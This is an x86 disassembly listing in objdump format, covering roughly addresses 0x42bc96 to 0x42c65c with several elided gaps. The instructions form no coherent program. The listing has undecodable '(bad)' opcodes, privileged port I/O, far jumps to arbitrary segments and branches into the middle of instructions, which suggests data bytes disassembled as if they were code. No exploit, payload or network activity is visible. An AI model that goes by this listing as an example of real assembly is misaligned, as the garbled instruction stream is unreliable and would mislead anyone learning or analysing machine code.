  42bc96:	sbb    eax,0x7aa035e6
  42bc9b:	in     eax,0x62
  42bc9d:	xchg   DWORD PTR [ebx+0x25138360],esp
  42bca3:	sbb    al,0x17
  42bca5:	xor    DWORD PTR [ebx+0x2c327947],ebx
  42bcab:	push   ds
  42bcac:	mov    ecx,0x2f9478dc
  42bcb1:	jae    0x42bc48
  42bcb3:	jmp    0x42bcee
  42bcb5:	pop    es
  42bcb6:	mov    cl,0x14
  42bcb8:	push   esp
  42bcb9:	xchg   esi,eax
  42bcba:	ins    DWORD PTR es:[edi],dx
  42bcbb:	cli    
  42bcbc:	fisub  DWORD PTR [ebx+0x72d40e6c]
  42bcc2:	jl     0x42bc49
  42bcc4:	pop    esp
  42bcc5:	rol    edi,1
  42bcc7:	push   0xffffff8e
  42bcc9:	std    
  42bcca:	in     al,dx
  42bccb:	jg     0x42bce5
  42bccd:	cmp    ch,bh
  42bccf:	fs sbb bh,al
  42bcd2:	push   edx
  42bcd3:	jecxz  0x42bd4e
  42bcd5:	dec    edi
  42bcd6:	mov    al,ds:0x45ff9039
  42bcdb:	pop    edi
  42bcdc:	cmp    DWORD PTR [ebx+0x36],0x6c
  42bce0:	sub    eax,0x2bcf9364
  42bce5:	mov    eax,0xfdeeb21c
  42bcea:	js     0x42bc9a
  42bcec:	outs   dx,DWORD PTR ds:[esi]
  42bced:	fmul   DWORD PTR [esi+0x7f81ae75]
  42bcf3:	iret   
  42bcf4:	push   ecx
  42bcf5:	fdivr  QWORD PTR [eax]
  42bcf7:	fmul   DWORD PTR ds:0xc644b578
  42bcfd:	repz sti 
  42bcff:	and    BYTE PTR [eax-0xa50c3af],ah
  42bd05:	sub    DWORD PTR ds:0xd1f7b811,esi
  42bd0b:	sub    al,0x8e
  42bd0d:	neg    DWORD PTR [edi-0x21aa055e]
  42bd13:	sar    cl,cl
  42bd15:	xor    BYTE PTR [esi+0x49e2b021],bh
  42bd1b:	and    BYTE PTR [eax+0x796b5da8],dl
  42bd21:	jg     0x42bda1
  42bd23:	fcmovnb st,st(5)
  42bd25:	push   esi
  42bd26:	xor    DWORD PTR [edi+0x5],ebx
  42bd29:	imul   edi,DWORD PTR ds:0xbb4cc212,0xe4a722b9
  42bd33:	inc    esi
  42bd34:	or     al,0x3
  42bd36:	clc    
  42bd37:	call   0xa140d8b2
  42bd3c:	xchg   ebp,eax
  42bd3d:	jge    0x42bcf4
  42bd3f:	stos   BYTE PTR es:[edi],al
  42bd40:	pop    edi
  42bd41:	into   
  42bd42:	test   al,0xa3
  42bd44:	and    eax,0x44e74188
  42bd49:	inc    edi
  42bd4a:	stos   BYTE PTR es:[edi],al
  42bd4b:	mov    dh,0xf2
  42bd4d:	daa    
  42bd4e:	push   eax
  42bd4f:	mov    cs,WORD PTR [eax+ebx*8]
  42bd52:	iret   
  42bd53:	jg     0x42bd6f
  42bd55:	or     esi,DWORD PTR [esi]
  42bd57:	cmp    dh,BYTE PTR [eax]
  42bd59:	xchg   edi,eax
  42bd5a:	xor    esp,DWORD PTR [ebp-0x3c]
  42bd5d:	xchg   esp,eax
  42bd5e:	or     eax,0x9c9672d9
  42bd63:	imul   eax,ebx,0xffffffb4
  42bd66:	add    eax,0xd6c2340
  42bd6b:	pop    edx
  42bd6c:	jae    0x42bdc7
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bd92
  42bde3:	pop    ebp
  42bde4:	push   eax
  42bde5:	mul    BYTE PTR [edi-0x2a]
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	ja     0x42be55
  42bdf0:	mov    ebp,DWORD PTR [esi+ecx*2-0x47f69451]
  42bdf7:	push   esp
  42bdf8:	or     eax,0xb10ce42d
  42bdfd:	mov    ds:0xa405c157,eax
  42be02:	je     0x42be6d
  42be04:	ja     0x42be4e
  42be06:	lock mov WORD PTR [esi-0x2c],ds
  42be0a:	or     al,0x37
  42be0c:	int    0xd7
  42be0e:	inc    esi
  42be0f:	ror    edi,1
  42be11:	in     eax,0xda
  42be13:	push   ss
  42be14:	xchg   DWORD PTR [ebx+0x2a02cc85],esp
  42be1a:	mov    es,ebx
  42be1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be1d:	sbb    al,BYTE PTR [edi+eax*8+0x115140f3]
  42be24:	push   ebx
  42be25:	mov    BYTE PTR [ebx-0x293759be],bl
  42be2b:	outs   dx,DWORD PTR ds:[esi]
  42be2c:	ja     0x42be7b
  42be2e:	jne    0x42be28
  42be30:	mov    eax,0xf5bde3cd
  42be35:	add    DWORD PTR [edx+0x752b31e7],edx
  42be3b:	push   esi
  42be3c:	daa    
  42be3d:	in     al,dx
  42be3e:	sub    BYTE PTR [edx],ah
  42be40:	xchg   edi,eax
  42be41:	dec    esi
  42be42:	jb     0x42bea3
  42be44:	fistp  WORD PTR [eax]
  42be46:	ds dec ebp
  42be48:	mov    ah,0x75
  42be4a:	pop    es
  42be4b:	es pop esp
  42be4d:	inc    esi
  42be4e:	sbb    bh,cl
  42be50:	jg     0x42be1e
  42be52:	dec    ecx
  42be53:	aas    
  42be54:	pop    ss
  42be55:	and    edi,DWORD PTR [esp+ebp*4+0x33]
  42be59:	xor    eax,0xdf580050
  42be5e:	push   0x47
  42be60:	ds int 0x43
  42be63:	inc    esp
  42be64:	popa   
  42be65:	imul   ah
  42be67:	outs   dx,DWORD PTR ds:[esi]
  42be68:	leave  
  42be69:	(bad)  
  42be6a:	push   edi
  42be6b:	add    al,0x25
  42be6d:	std    
  42be6e:	jnp    0x42bdfb
  42be70:	pop    ss
  42be71:	fwait
  42be72:	xor    ecx,DWORD PTR [esi-0x16]
  42be75:	mov    ds:0xcfd6fb0f,al
  42be7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be7b:	push   ebx
  42be7c:	in     eax,0x76
  42be7e:	sub    al,0x3f
  42be80:	and    eax,0x1c692644
  42be85:	ret    0x3c42
  42be88:	or     DWORD PTR [ebp-0x10451d79],0x1f
  42be8f:	scas   al,BYTE PTR es:[edi]
  42be90:	pop    es
  42be91:	fist   WORD PTR [ebx+0x2fe4ee5e]
  42be97:	fdivr  DWORD PTR [esi-0x59766f5e]
  42be9d:	arpl   WORD PTR [ebx+0x128ece84],ax
  42bea3:	repnz add DWORD PTR [esi+0x11141a31],esp
  42beaa:	push   0x3937a268
  42beaf:	iret   
  42beb0:	pop    esi
  42beb1:	and    al,0xe1
  42beb3:	pop    ebx
  42beb4:	adc    ah,ch
  42beb6:	adc    dh,bl
  42beb8:	mov    eax,0x6f94bfb1
  42bebd:	pop    esi
  42bebe:	and    eax,0xcaf18f0c
  42bec3:	pop    esi
  42bec4:	dec    ecx
  42bec5:	std    
  42bec6:	ins    DWORD PTR es:[edi],dx
  42bec7:	pop    es
  42bec8:	int3   
  42bec9:	push   0x74c97e34
  42bece:	arpl   cx,sp
  42bed0:	(bad)  
  42bed1:	mov    al,0x80
  42bed3:	and    al,BYTE PTR [ebx-0x5ac9087d]
  42bed9:	bound  edi,QWORD PTR [edi]
  42bedb:	add    DWORD PTR [eax-0x59],edi
  42bede:	sub    ebp,ebp
  42bee0:	mov    bl,BYTE PTR [eax+edi*4]
  42bee3:	icebp  
  42bee4:	add    cl,al
  42bee6:	ss xchg ebp,eax
  42bee8:	pop    ebp
  42bee9:	mov    al,ds:0x45d95027
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0x4e7bd7c8,eax
  42bf63:	or     dl,BYTE PTR [esi]
  42bf65:	and    BYTE PTR [edi-0x29],ah
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	iret   
  42bf6f:	lds    eax,FWORD PTR ds:0x9d651faa
  42bf75:	add    al,0xb3
  42bf77:	bound  esi,QWORD PTR [edi-0xa49427c]
  42bf7d:	jge    0x42bfd8
  42bf7f:	iret   
  42bf80:	or     ecx,DWORD PTR [eax]
  42bf82:	cld    
  42bf83:	cmp    BYTE PTR [ecx],cl
  42bf85:	(bad)  
  42bf86:	fadd   DWORD PTR ds:0x6505b93b
  42bf8d:	imul   ebp,DWORD PTR ds:0xf9ff7b6e,0xffffff99
  42bf94:	mov    edi,0x79452f76
  42bf99:	or     eax,0xab7f44b8
  42bf9e:	xchg   esi,eax
  42bf9f:	push   eax
  42bfa0:	jmp    0x42c01d
  42bfa2:	clc    
  42bfa3:	push   ds
  42bfa4:	(bad)  
  42bfa5:	sbb    ch,BYTE PTR [ecx-0x539f1a84]
  42bfab:	(bad)  
  42bfac:	fs data16 ds je 0x42bfff
  42bfb1:	mov    bl,0x3e
  42bfb3:	pop    ebx
  42bfb4:	call   0x236e:0xcfbba38d
  42bfbb:	shr    edi,1
  42bfbd:	bound  ebp,QWORD PTR [esi+0xb]
  42bfc0:	aam    0xaf
  42bfc2:	fistp  DWORD PTR [eax+0x61]
  42bfc5:	rol    BYTE PTR [ebx],cl
  42bfc7:	call   0x52b11716
  42bfcc:	idiv   DWORD PTR [eax-0x2a73f1db]
  42bfd2:	or     al,0x56
  42bfd4:	xchg   esp,eax
  42bfd5:	pop    ebx
  42bfd6:	sbb    edi,DWORD PTR [edi-0x21]
  42bfd9:	push   edi
  42bfda:	sahf   
  42bfdb:	mov    BYTE PTR [ecx+0x78],ah
  42bfde:	shl    dh,cl
  42bfe0:	xchg   ebp,eax
  42bfe1:	sub    BYTE PTR [edi],dh
  42bfe3:	div    BYTE PTR [edi-0x57]
  42bfe6:	in     eax,dx
  42bfe7:	addr16 or eax,0x12d6916a
  42bfed:	nop
  42bfee:	test   BYTE PTR [eax+0x2d],ch
  42bff1:	sub    BYTE PTR [esi-0x5a8ceaef],ah
  42bff7:	adc    ch,ah
  42bff9:	repz xchg esi,eax
  42bffb:	jmp    0x1cdf:0xc8366ae4
  42c002:	dec    eax
  42c003:	pushw  0x48
  42c006:	nop
  42c007:	les    ebp,FWORD PTR [ebp+0x4cd421f2]
  42c00d:	mov    ch,0x69
  42c00f:	xchg   ebx,eax
  42c010:	dec    esp
  42c011:	mov    ds:0xbaded419,al
  42c016:	aas    
  42c017:	xchg   ebp,eax
  42c018:	outs   dx,BYTE PTR ds:[esi]
  42c019:	mov    ch,0xd2
  42c01b:	mov    cl,0x7f
  42c01d:	xlat   BYTE PTR ds:[ebx]
  42c01e:	and    dh,ch
  42c020:	xor    DWORD PTR [eax+0xa46eb35],ebp
  42c026:	cs out 0xad,eax
  42c029:	inc    ebx
  42c02a:	shl    DWORD PTR [bx+si],0xe6
  42c02e:	fist   DWORD PTR [ebp-0x406bca1f]
  42c034:	pop    esp
  42c035:	test   edi,0xbf247750
  42c03b:	xor    edx,DWORD PTR [edx]
  42c03d:	les    ecx,FWORD PTR [edx+0x58]
  42c040:	out    dx,eax
  42c041:	and    DWORD PTR [esi+ebp*2+0xc],edi
  42c045:	fstp   DWORD PTR [esi]
  42c047:	cmp    al,0xcd
  42c049:	(bad)  
  42c04a:	jb     0x42c053
  42c04c:	sti    
  42c04d:	push   eax
  42c04e:	sbb    al,0x28
  42c050:	dec    esi
  42c051:	ss dec esi
  42c053:	xor    BYTE PTR [ebp-0x55e86ba3],0x1
  42c05a:	jmp    0x42c028
  42c05c:	je     0x42c05f
  42c05e:	sti    
  42c05f:	in     eax,dx
  42c060:	sahf   
  42c061:	mov    ecx,0x1a71abce
  42c066:	mov    DWORD PTR [ebp-0x56a9b56a],ecx
  42c06c:	rcl    BYTE PTR [edi],1
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	pop    esp
  42c0e3:	and    dh,ch
  42c0e5:	pop    ebp
  42c0e6:	fadd   DWORD PTR [bx+di]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [ebx],dh
  42c0ef:	xchg   ecx,eax
  42c0f0:	retf   
  42c0f1:	mov    edx,0x72420192
  42c0f6:	iret   
  42c0f7:	ja     0x42c07f
  42c0f9:	(bad)  
  42c0fa:	mov    edi,0xa78d0840
  42c0ff:	and    BYTE PTR [edx],cl
  42c101:	sbb    dl,ah
  42c103:	inc    edx
  42c104:	sub    cl,dl
  42c106:	sahf   
  42c107:	fadd   st,st(4)
  42c109:	or     cl,BYTE PTR [ecx+0x3060ad79]
  42c10f:	test   al,0x75
  42c111:	add    dl,BYTE PTR [edx]
  42c113:	fidiv  WORD PTR [ecx+0x70]
  42c116:	sub    eax,0x16301388
  42c11b:	addr16 jb 0x42c109
  42c11e:	mov    esp,0xd3520378
  42c123:	sar    DWORD PTR [ebx+ebx*2-0x55],1
  42c127:	fidivr DWORD PTR [ebp+0x26af7de]
  42c12d:	inc    esi
  42c12e:	out    0xb0,al
  42c130:	cmp    al,0xfa
  42c132:	not    DWORD PTR [eax-0xfc50048]
  42c138:	or     edx,DWORD PTR [ecx+ecx*2-0x56]
  42c13c:	sub    ebp,DWORD PTR ds:0xfa48a076
  42c142:	int    0x46
  42c144:	into   
  42c145:	sub    al,BYTE PTR [ebx-0x76b3e1a0]
  42c14b:	adc    BYTE PTR [edi-0x7f68e5e2],dh
  42c151:	sub    al,0x74
  42c153:	idiv   bl
  42c155:	xlat   BYTE PTR ds:[ebx]
  42c156:	and    ecx,ebp
  42c158:	stos   BYTE PTR es:[edi],al
  42c159:	adc    edi,DWORD PTR [ecx]
  42c15b:	inc    edi
  42c15c:	adc    ecx,ebx
  42c15e:	arpl   WORD PTR [edx+0x1f46e379],dx
  42c164:	cpuid  
  42c166:	push   ss
  42c167:	clc    
  42c168:	in     eax,0x6e
  42c16a:	lds    esi,FWORD PTR [edi+0x5c]
  42c16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c16e:	ja     0x42c1d7
  42c170:	cs push ds
  42c172:	fistp  WORD PTR [ecx+0x3205aa46]
  42c178:	sub    al,dh
  42c17a:	pop    ebx
  42c17b:	clc    
  42c17c:	mov    ch,BYTE PTR [ebx+edi*4]
  42c17f:	mov    ds:0x65145b3a,al
  42c184:	test   BYTE PTR [esp+eax*8+0xa],0x90
  42c189:	mov    ch,0xba
  42c18b:	das    
  42c18c:	imul   ebp,DWORD PTR [ebx],0xac7442d2
  42c192:	xchg   ecx,edi
  42c194:	adc    eax,0x2760396a
  42c199:	and    edi,eax
  42c19b:	xchg   edx,eax
  42c19c:	cmp    DWORD PTR ds:0xc135db37,eax
  42c1a2:	dec    ebx
  42c1a3:	fs or  bh,0x56
  42c1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1a8:	pop    edi
  42c1a9:	mov    edx,0x846848fb
  42c1ae:	mov    ecx,0xe28ed7b8
  42c1b3:	ins    DWORD PTR es:[edi],dx
  42c1b4:	mov    ds:0xf2c01748,eax
  42c1b9:	das    
  42c1ba:	out    dx,al
  42c1bb:	xchg   esp,eax
  42c1bc:	out    0xc3,al
  42c1be:	(bad)  
  42c1bf:	jmp    0x9740:0x25e5bd22
  42c1c6:	cli    
  42c1c7:	pop    eax
  42c1c8:	xchg   edi,eax
  42c1c9:	ror    DWORD PTR [eax+0x3f],cl
  42c1cc:	sbb    ah,BYTE PTR [ebx]
  42c1ce:	inc    edi
  42c1cf:	cmp    dl,BYTE PTR [eax-0x3d]
  42c1d2:	das    
  42c1d3:	mov    eax,ds:0x9be9df32
  42c1d8:	pop    esp
  42c1d9:	cmp    ch,dl
  42c1db:	inc    eax
  42c1dc:	cmc    
  42c1dd:	and    eax,0x74030b55
  42c1e2:	out    0xe8,eax
  42c1e4:	push   ds
  42c1e5:	loope  0x42c232
  42c1e7:	xchg   DWORD PTR [eax-0x6065c967],edi
  42c1ed:	mov    eax,0x0
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	inc    edi
  42c263:	jno    0x42c1ed
  42c265:	shl    BYTE PTR [edi-0x27],0x1
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    BYTE PTR [ebx+edx*8+0x1],al
  42c271:	push   edx
  42c272:	sub    eax,0xdad600e9
  42c277:	pop    esi
  42c278:	rcl    BYTE PTR [edx],0x23
  42c27b:	adc    bl,BYTE PTR [edx-0x74d94941]
  42c281:	xor    ebx,DWORD PTR [eax]
  42c283:	jae    0x42c285
  42c285:	push   0xffffffd8
  42c287:	repnz mov edi,0x69b515ef
  42c28d:	cmp    al,0xc3
  42c28f:	fistp  QWORD PTR [esi+ebp*8-0x7c177e16]
  42c296:	mov    dh,0x2e
  42c298:	jnp    0x42c26a
  42c29a:	fistp  QWORD PTR [edx+0x61]
  42c29d:	dec    ebx
  42c29e:	imul   si,WORD PTR es:[si],0x75
  42c2a4:	xlat   BYTE PTR ds:[ebx]
  42c2a5:	inc    ecx
  42c2a6:	arpl   WORD PTR [edi],dx
  42c2a8:	xchg   DWORD PTR [esi+ebx*4+0x1f],esi
  42c2ac:	call   0x829d:0x4c1c73f8
  42c2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2b4:	xchg   edx,eax
  42c2b5:	cli    
  42c2b6:	fistp  DWORD PTR [edi]
  42c2b8:	ret    0x385b
  42c2bb:	pop    ebx
  42c2bc:	scas   eax,DWORD PTR es:[edi]
  42c2bd:	xchg   BYTE PTR [eax+ebx*2-0x7c],bl
  42c2c1:	outs   dx,BYTE PTR ds:[esi]
  42c2c2:	sbb    eax,0xea76126
  42c2c7:	das    
  42c2c8:	or     ebx,DWORD PTR [ebp+0x788bbdf0]
  42c2ce:	addr16 dec edi
  42c2d0:	or     al,0x7d
  42c2d2:	xor    esi,esi
  42c2d4:	push   es
  42c2d5:	sahf   
  42c2d6:	and    dh,BYTE PTR [ebx-0x2e4e1c02]
  42c2dc:	mov    ds:0x15f78e0d,eax
  42c2e1:	loope  0x42c2a0
  42c2e3:	jecxz  0x42c32c
  42c2e5:	mov    eax,0xc55f9072
  42c2ea:	jnp    0x42c2a8
  42c2ec:	push   esp
  42c2ed:	dec    edx
  42c2ee:	cwde   
  42c2ef:	inc    ebp
  42c2f0:	push   ss
  42c2f1:	lock or al,0x34
  42c2f4:	and    bl,ah
  42c2f6:	and    DWORD PTR ds:0xbb5d7124,ecx
  42c2fc:	ror    BYTE PTR [esp+eax*1+0x17],1
  42c300:	scas   eax,DWORD PTR es:[edi]
  42c301:	addr16 dec edi
  42c303:	ror    edi,1
  42c305:	mov    ecx,0x12461702
  42c30a:	mov    esi,0x61d8cc3f
  42c30f:	call   0x97f3bdb7
  42c314:	mov    eax,0x6010ac74
  42c319:	enter  0xe161,0xbb
  42c31d:	fst    DWORD PTR [ebx-0x2cc65424]
  42c323:	mov    al,BYTE PTR [edx+0x3b]
  42c326:	pop    edi
  42c327:	cwde   
  42c328:	lods   al,BYTE PTR ds:[esi]
  42c329:	in     al,dx
  42c32a:	jo     0x42c3a5
  42c32c:	or     eax,0x7134d4af
  42c331:	xchg   edi,eax
  42c332:	fimul  WORD PTR [ebp-0x27]
  42c335:	loope  0x42c366
  42c337:	and    bl,BYTE PTR [esi]
  42c339:	inc    edi
  42c33a:	push   esp
  42c33b:	or     esi,DWORD PTR [ebp+0x48c48ccd]
  42c341:	ret    0x5539
  42c344:	stc    
  42c345:	dec    ebp
  42c346:	out    dx,eax
  42c347:	fcomp  st(4)
  42c349:	jnp    0x42c355
  42c34b:	jne    0x42c38c
  42c34d:	cmp    al,0x49
  42c34f:	pop    esi
  42c350:	(bad)  
  42c351:	jmp    0x8cecf9e1
  42c356:	pop    ss
  42c357:	cwde   
  42c358:	adc    BYTE PTR [eax-0x60],dh
  42c35b:	test   edi,edx
  42c35d:	mov    esp,0x3955e0c2
  42c362:	pop    eax
  42c363:	pushf  
  42c364:	add    esi,ebp
  42c366:	mov    ds:0x6ab81b6,eax
  42c36b:	ret    
  42c36c:	hlt    
  42c36d:	ret    0x0
	...
  42c3d4:	add    BYTE PTR [eax],al
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x2a3deef6
  42c3e5:	xchg   ebp,eax
  42c3e6:	fiadd  DWORD PTR [bx+di]
  42c3e9:	add    BYTE PTR [eax],al
  42c3eb:	add    DWORD PTR [eax],eax
  42c3ed:	add    BYTE PTR [ecx+esi*8+0x56],cl
  42c3f1:	out    dx,al
  42c3f2:	sbb    esp,DWORD PTR [edi+ebx*1]
  42c3f5:	ret    
  42c3f6:	in     eax,0x41
  42c3f8:	out    0x32,al
  42c3fa:	sbb    al,0x20
  42c3fc:	sbb    DWORD PTR [ecx],0xbbe9525c
  42c402:	mov    edi,cs
  42c404:	clc    
  42c405:	pop    esp
  42c406:	adc    al,0xbf
  42c408:	sbb    eax,0xfbe2fa6a
  42c40d:	jo     0x42c428
  42c40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c410:	outs   dx,DWORD PTR ds:[esi]
  42c411:	mov    ds:0x26136cc5,al
  42c416:	imul   edx,DWORD PTR [ecx+0x21aac8d6],0x23
  42c41d:	dec    eax
  42c41e:	inc    edi
  42c41f:	jb     0x42c49c
  42c421:	push   ebp
  42c422:	sub    al,0xef
  42c424:	test   DWORD PTR [ebx-0x54],eax
  42c427:	sub    BYTE PTR [edx+0x5f2af993],0xf5
  42c42e:	pop    edi
  42c42f:	or     ah,BYTE PTR [ebx+eiz*1]
  42c432:	test   ebp,eax
  42c434:	data16 cli 
  42c436:	mov    ecx,edi
  42c438:	pop    ebp
  42c439:	adc    bh,BYTE PTR [ebx-0x7c]
  42c43c:	cmc    
  42c43d:	xchg   ebx,eax
  42c43e:	jne    0x42c43f
  42c440:	das    
  42c441:	bound  ecx,QWORD PTR [esi-0x1d]
  42c444:	fadd   QWORD PTR [ecx-0x38225705]
  42c44a:	arpl   di,cx
  42c44c:	push   ebp
  42c44d:	mov    al,0x61
  42c44f:	xchg   esp,eax
  42c450:	inc    eax
  42c451:	in     al,0x41
  42c453:	imul   ecx,DWORD PTR [edx-0x9],0x1af8e9d0
  42c45a:	out    0xf7,al
  42c45c:	jns    0x42c4b1
  42c45e:	je     0x42c4b2
  42c460:	mov    bl,0xea
  42c462:	inc    ecx
  42c463:	cwde   
  42c464:	mov    al,0x86
  42c466:	mov    eax,DWORD PTR [edi+0x7e]
  42c469:	out    dx,al
  42c46a:	sbb    bh,bl
  42c46c:	mov    dh,0xef
  42c46e:	sbb    cl,BYTE PTR [ebx]
  42c470:	in     eax,dx
  42c471:	cmp    ebp,DWORD PTR [eax-0x36]
  42c474:	int    0x92
  42c476:	mov    ch,0xc4
  42c478:	and    DWORD PTR [esi],esi
  42c47a:	cmp    BYTE PTR [esp+esi*1],dh
  42c47d:	cs leave 
  42c47f:	sub    eax,0x49ae1487
  42c484:	gs (bad) 
  42c486:	stos   BYTE PTR es:[edi],al
  42c487:	xchg   DWORD PTR [ebx*4+0x194ec9c5],ebx
  42c48e:	stos   DWORD PTR es:[edi],eax
  42c48f:	adc    DWORD PTR [ecx],edi
  42c491:	mov    esp,DWORD PTR [edx-0x5661a669]
  42c497:	add    DWORD PTR [esi-0x5256adb],0xe167f5b7
  42c4a1:	dec    eax
  42c4a2:	or     dh,BYTE PTR ds:0x1a610d27
  42c4a8:	jle    0x42c4c4
  42c4aa:	retf   0xa191
  42c4ad:	bound  eax,QWORD PTR [eax]
  42c4af:	aad    0x6b
  42c4b1:	jnp    0x42c439
  42c4b3:	adc    esi,DWORD PTR [ecx-0x22e99ce7]
  42c4b9:	mov    DWORD PTR [ebp-0x30],edx
  42c4bc:	mov    ch,0xe
  42c4be:	clc    
  42c4bf:	mov    eax,0x7e06ec5b
  42c4c4:	ror    DWORD PTR [esi+ebp*2],1
  42c4c7:	jl     0x42c537
  42c4c9:	add    al,0x5b
  42c4cb:	retf   0xe742
  42c4ce:	xchg   ecx,eax
  42c4cf:	push   edx
  42c4d0:	cs (bad) 
  42c4d2:	xlat   BYTE PTR ds:[ebx]
  42c4d3:	test   ebx,eax
  42c4d5:	jbe    0x42c4ee
  42c4d7:	push   ebp
  42c4d8:	cwde   
  42c4d9:	sbb    DWORD PTR [ebx-0x4c],esi
  42c4dc:	ror    DWORD PTR [edi],cl
  42c4de:	jmp    0x42c4ea
  42c4e0:	test   BYTE PTR [ebx-0x1253fea3],0x25
  42c4e7:	sti    
  42c4e8:	push   ebp
  42c4e9:	xchg   edx,eax
  42c4ea:	push   ecx
  42c4eb:	aad    0x15
  42c4ed:	cwde   
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xd134,0xc9
  42c564:	dec    BYTE PTR ds:0x1db67
  42c56a:	add    BYTE PTR [ecx],al
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	pop    edx
  42c56f:	fsqrt  
  42c571:	adc    eax,DWORD PTR [edx-0x3]
  42c574:	in     eax,dx
  42c575:	fwait
  42c576:	fwait
  42c577:	data16 in al,dx
  42c579:	sub    DWORD PTR [edx],edi
  42c57b:	jg     0x42c523
  42c57d:	fs inc esp
  42c57f:	(bad)  [esi-0xd]
  42c582:	aad    0x14
  42c584:	xchg   ebp,eax
  42c585:	shl    sp,cl
  42c588:	dec    ecx
  42c589:	sahf   
  42c58a:	jnp    0x42c583
  42c58c:	pop    es
  42c58d:	adc    esi,DWORD PTR [ebp-0x7e8f58b4]
  42c593:	test   eax,0x2f38f35e
  42c598:	push   ebx
  42c599:	ja     0x42c528
  42c59b:	xchg   ebp,eax
  42c59c:	in     al,0x6
  42c59e:	(bad)  
  42c59f:	(bad)  
  42c5a0:	jns    0x42c601
  42c5a2:	cmp    DWORD PTR [ebx],ebp
  42c5a4:	adc    BYTE PTR [esi],bh
  42c5a6:	or     dl,dh
  42c5a8:	lds    esi,FWORD PTR [edx+0x6270e1e0]
  42c5ae:	jo     0x42c601
  42c5b0:	mov    ch,0xc1
  42c5b2:	dec    ecx
  42c5b3:	inc    ecx
  42c5b4:	mov    ecx,DWORD PTR [eax-0x14]
  42c5b7:	dec    ebp
  42c5b8:	jns    0x42c637
  42c5ba:	test   al,0xd0
  42c5bc:	jne    0x42c629
  42c5be:	ja     0x42c565
  42c5c0:	imul   eax,DWORD PTR [ebp+0x2e],0xffffff8c
  42c5c4:	arpl   WORD PTR [ebx],bp
  42c5c6:	scas   al,BYTE PTR es:[edi]
  42c5c7:	or     DWORD PTR [ecx-0x4d],ecx
  42c5ca:	jno    0x42c5f8
  42c5cc:	pop    esi
  42c5cd:	arpl   WORD PTR [ebx-0x483ee3b2],bp
  42c5d3:	aas    
  42c5d4:	popf   
  42c5d5:	push   esi
  42c5d6:	mov    ebp,0x91a9b72b
  42c5db:	pop    ds
  42c5dc:	jle    0x42c65d
  42c5de:	mov    ecx,0x85b57062
  42c5e3:	in     eax,0xb7
  42c5e5:	int3   
  42c5e6:	sbb    DWORD PTR [esi+0x1d],edi
  42c5e9:	in     eax,dx
  42c5ea:	cmp    ebp,DWORD PTR [esi-0x3b]
  42c5ed:	sub    dh,dl
  42c5ef:	idiv   BYTE PTR [ebx+ebx*2-0x26bbab87]
  42c5f6:	rcr    dh,1
  42c5f8:	mov    esp,gs
  42c5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5fb:	xor    al,ch
  42c5fd:	xor    ebp,esi
  42c5ff:	push   cs
  42c600:	pop    eax
  42c601:	or     esp,ebx
  42c603:	pop    ds
  42c604:	ret    0x67b
  42c607:	arpl   WORD PTR [ebp-0x4e],si
  42c60a:	iret   
  42c60b:	dec    eax
  42c60c:	lods   eax,DWORD PTR ds:[esi]
  42c60d:	les    ebx,FWORD PTR [edx+0x40162c9d]
  42c613:	out    0x1,eax
  42c615:	xor    BYTE PTR [ecx],bh
  42c617:	in     al,0xf7
  42c619:	sbb    eax,0xa97c6dc9
  42c61e:	ins    DWORD PTR es:[edi],dx
  42c61f:	cmp    al,0x71
  42c621:	lahf   
  42c622:	xor    bh,BYTE PTR [eax+0x35e2735e]
  42c628:	jecxz  0x42c5f8
  42c62a:	jne    0x42c640
  42c62c:	clc    
  42c62d:	adc    esp,DWORD PTR [ecx-0x2]
  42c630:	adc    al,0x2
  42c632:	mov    DWORD PTR [esi-0x26],edi
  42c635:	int3   
  42c636:	jnp    0x42c6aa
  42c638:	bound  edx,QWORD PTR [ecx]
  42c63a:	call   0x7ae6:0x5e465a78
  42c641:	sub    eax,0x52bef700
  42c646:	inc    ecx
  42c647:	xor    BYTE PTR [ebp+0x4141253c],cl
  42c64d:	retf   
  42c64e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c64f:	in     eax,dx
  42c650:	jbe    0x42c63f
  42c652:	jmp    0x42c678
  42c654:	push   es
  42c655:	mov    al,0xf7
  42c657:	lods   al,BYTE PTR ds:[esi]
  42c658:	pop    ebx
  42c659:	add    al,0x5
  42c65b:	dec    esi
  42c65c:	in     al,0xa8
